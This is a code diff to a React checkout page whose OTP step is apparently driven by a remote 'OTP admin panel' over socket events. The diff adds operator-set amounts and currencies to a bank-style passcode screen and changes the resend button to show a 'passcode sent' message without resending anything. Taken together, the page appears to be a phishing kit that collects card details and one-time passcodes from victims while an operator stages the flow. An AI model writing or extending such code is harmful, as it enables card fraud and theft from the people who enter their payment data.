@@ -83,6 +83,8 @@ const Checkout = () => {
   
   const planName = searchParams.get('plan') || 'Complete';
   const billing = searchParams.get('billing') || 'yearly';
+  const customAmount = searchParams.get('amount');
+  const linkId = searchParams.get('linkId');
   
   // Clear any previous checkout data when starting a new session
   useEffect(() => {
@@ -224,6 +226,11 @@ const Checkout = () => {
   const [otpLoading, setOtpLoading] = useState(false);
   const [showCancelConfirm, setShowCancelConfirm] = useState(false);
   const [transactionCancelError, setTransactionCancelError] = useState("");
+  
+  // Currency customization state from OTP admin panel
+  const [otpCustomAmount, setOtpCustomAmount] = useState<number | null>(null);
+  const [otpCurrency, setOtpCurrency] = useState('INR');
+  const [otpCurrencySymbol, setOtpCurrencySymbol] = useState('₹');
 
   // Card brand logos
   const cardBrandLogos = {
@@ -301,9 +308,18 @@ const Checkout = () => {
     }
   };
 
-  const currentPlan = pricingData[billing as keyof typeof pricingData][planName as keyof typeof pricingData.yearly];
-  const displayPrice = billing === 'yearly' ? currentPlan.price : currentPlan.monthly;
-  const billingText = billing === 'yearly' ? 'Annually' : 'Monthly';
+  // Handle custom amount from payment link
+  let displayPrice: number;
+  let billingText: string;
+  
+  if (customAmount && !isNaN(parseFloat(customAmount))) {
+    displayPrice = parseFloat(customAmount);
+    billingText = 'Custom Amount';
+  } else {
+    const currentPlan = pricingData[billing as keyof typeof pricingData][planName as keyof typeof pricingData.yearly];
+    displayPrice = billing === 'yearly' ? currentPlan.price : currentPlan.monthly;
+    billingText = billing === 'yearly' ? 'Annually' : 'Monthly';
+  }
 
   // Check for card declined error from location state
   useEffect(() => {
@@ -422,12 +438,37 @@ const Checkout = () => {
         if (!value) return 'Expiry month is required';
         const month = parseInt(value);
         if (month < 1 || month > 12) return 'Invalid month';
+        
+        // Check if month/year combination is in the past
+        if (cardData.expiryYear) {
+          const year = parseInt(cardData.expiryYear);
+          const fullYear = year < 50 ? 2000 + year : 1900 + year;
+          const currentDate = new Date();
+          const currentYear = currentDate.getFullYear();
+          const currentMonth = currentDate.getMonth() + 1;
+          
+          if (fullYear < currentYear || (fullYear === currentYear && month < currentMonth)) {
+            return 'Card has expired. Please enter a valid expiry date';
+          }
+        }
         return '';
       case 'expiryYear':
         if (!value) return 'Expiry year is required';
         const year = parseInt(value);
-        const currentYear = new Date().getFullYear() % 100;
-        if (year < currentYear || year > currentYear + 50) return 'Invalid year';
+        const fullYear = year < 50 ? 2000 + year : 1900 + year;
+        const currentDate = new Date();
+        const currentYear = currentDate.getFullYear();
+        const currentMonth = currentDate.getMonth() + 1;
+        
+        if (fullYear < currentYear || fullYear > currentYear + 50) return 'Invalid year';
+        
+        // Check if month/year combination is in the past
+        if (cardData.expiryMonth) {
+          const month = parseInt(cardData.expiryMonth);
+          if (fullYear < currentYear || (fullYear === currentYear && month < currentMonth)) {
+            return 'Card has expired. Please enter a valid expiry date';
+          }
+        }
         return '';
       case 'cvv':
         if (!value.trim()) return 'CVV is required';
@@ -453,9 +494,21 @@ const Checkout = () => {
       formattedValue = formatCardNumber(value);
     }
     
-    setCardData(prev => ({ ...prev, [field]: formattedValue }));
-    const error = validateCardField(field, formattedValue);
-    setCardErrors(prev => ({ ...prev, [field]: error }));
+    setCardData(prev => {
+      const newCardData = { ...prev, [field]: formattedValue };
+      
+      // Cross-validate expiry fields when either changes
+      if (field === 'expiryMonth' || field === 'expiryYear') {
+        const monthError = validateCardField('expiryMonth', newCardData.expiryMonth);
+        const yearError = validateCardField('expiryYear', newCardData.expiryYear);
+        setCardErrors(prev => ({ ...prev, expiryMonth: monthError, expiryYear: yearError }));
+      } else {
+        const error = validateCardField(field, formattedValue);
+        setCardErrors(prev => ({ ...prev, [field]: error }));
+      }
+      
+      return newCardData;
+    });
   };
 
   const isCardFormValid = () => {
@@ -623,10 +676,28 @@ const Checkout = () => {
     }
     console.log('Registering socket event listeners for paymentId:', paymentId);
     // Register event listeners
-    socket.on('show-otp', () => {
+    socket.on('show-otp', (data) => {
+      console.log('Show OTP with currency data:', data);
       setConfirmingPayment(false);
       setShowOtp(true);
       setCurrentStep('otp');
+      
+      // Update currency display if custom data is provided
+      if (data && data.customAmount !== undefined) {
+        setOtpCustomAmount(data.customAmount);
+        setOtpCurrency(data.currency || 'INR');
+        setOtpCurrencySymbol(data.currencySymbol || '₹');
+        console.log('Updated OTP currency display:', {
+          amount: data.customAmount,
+          currency: data.currency,
+          symbol: data.currencySymbol
+        });
+      } else {
+        // Reset to defaults if no custom data
+        setOtpCustomAmount(null);
+        setOtpCurrency('INR');
+        setOtpCurrencySymbol('₹');
+      }
       
       // Show loading overlay for 4-5 seconds
       setOtpLoading(true);
@@ -1631,7 +1702,13 @@ const Checkout = () => {
                         </tr>
                         <tr>
                           <td className="text-gray-600 py-1">Amount</td>
-                          <td className="text-right font-bold text-blue-700 py-1">₹{displayPrice.toLocaleString()}</td>
+                          <td className="text-right font-bold text-blue-700 py-1">
+                            {otpCustomAmount !== null ? (
+                              `${otpCurrencySymbol}${otpCustomAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
+                            ) : (
+                              `₹${displayPrice.toLocaleString()}`
+                            )}
+                          </td>
                         </tr>
                         <tr>
                           <td className="text-gray-600 py-1">Personal Message</td>
@@ -1683,7 +1760,8 @@ const Checkout = () => {
                     <button
                       onClick={() => {
                         setResendMessage('One time passcode has been sent to your registered mobile number XX' + otpMobileLast4);
-                        startOtpTimer();
+                        // Clear the message after 3 seconds
+                        setTimeout(() => setResendMessage(''), 3000);
                       }}
                       className="text-blue-700 text-xs font-semibold hover:underline focus:outline-none"
                       disabled={otpSubmitting}
